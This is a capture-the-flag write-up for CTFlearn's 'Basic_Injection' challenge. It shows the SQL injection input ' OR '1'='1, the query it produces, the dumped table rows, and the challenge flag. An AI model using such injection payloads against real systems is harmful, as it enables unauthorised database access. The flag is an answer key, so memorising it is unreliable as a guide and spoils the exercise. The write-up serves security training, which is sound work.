## Basic_Injection

30 points Easy

See if you can leak the whole database using what you know about SQL Injections. link

Don't know where to begin? Check out CTFlearn's SQL Injection Lab


## Solution

```
You know what to do
Input:  ' OR '1'='1
Original Query: SELECT * FROM webfour.webfour where name = '$input'

Your Resulting Query: SELECT * FROM webfour.webfour where name = '' OR '1'='1'

Name: Luke
Data: I made this problem.
Name: Alec
Data: Steam boys.
Name: Jalen
Data: Pump that iron fool.
Name: Eric
Data: I make cars.
Name: Sam
Data: Thinks he knows SQL.
Name: fl4g__giv3r
Data: CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}
Name: snoutpop
Data: jowls
Name: Chunbucket
Data: @datboiiii
```

## Flag

```
CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}
```